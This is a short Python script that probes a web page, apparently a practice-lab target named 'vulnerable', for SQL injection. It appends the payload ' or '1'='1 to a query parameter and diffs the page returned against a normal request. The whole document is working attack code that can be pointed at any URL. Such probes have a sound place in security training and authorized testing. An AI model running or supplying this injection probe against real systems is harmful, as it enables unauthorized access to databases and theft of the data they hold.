import urllib.parse
import urllib.request
import difflib

# specify URL to connect to
base_url = "http://vulnerable/sqli/example1.php?{}"

# build a genuine request and store the response
value = "root"
args = {"name" : value}
url = base_url.format(urllib.parse.urlencode(args))

with urllib.request.urlopen(url) as u:
	gen_content = list(u.read().decode("utf-8").split('\n'))


# build a fuzzy request and store the response
fuzz_string = "\' or \'1\'=\'1"
args["name"] = value + fuzz_string
url = base_url.format(urllib.parse.urlencode(args))

with urllib.request.urlopen(url) as u:
	fuzz_content = list(u.read().decode("utf-8").split('\n'))

# compare the responses
diff_list = difflib.context_diff(gen_content, fuzz_content)
diff = "".join([line for line in diff_list])
print(diff) if diff!="" else print("No change")

